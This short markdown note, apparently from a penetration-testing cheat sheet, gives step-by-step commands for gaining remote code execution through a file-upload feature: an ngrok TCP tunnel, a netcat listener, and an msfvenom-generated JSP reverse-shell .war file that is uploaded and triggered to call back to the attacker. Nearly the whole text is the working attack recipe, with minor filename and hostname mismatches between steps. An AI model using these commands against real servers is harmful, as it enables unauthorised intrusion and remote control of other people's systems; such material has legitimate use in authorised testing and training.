
## File upload using ngrok and nc remote code execution


**Step 1:** Set up ngrok and netcat listener.
- Run `ngrok tcp 4000` to expose port 4000 via ngrok.
- Set up netcat listener on localhost port 4000: `nc -lvnp 4000`.
- Note the port forwarding link like `0.tcp.in.ngrok.io:15736`.

**Step 2:** Create malicious .war file using msfvenom.
- Generate .war file with customized LHOST and LPORT:
  ```
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=0.tcp.ngrok.io LPORT=15736 -f war -o rev_shell1.war
  ```
- Make .war file executable: `chmod 777 rev_shell.war`.

**Step 3:** Upload .war file in the designated section and await shell.

**Step 4:** Click on the endpoint (e.g., view the file in a new tab) to execute.

**Step 5:** Observe executed code on the system for successful exploitation.
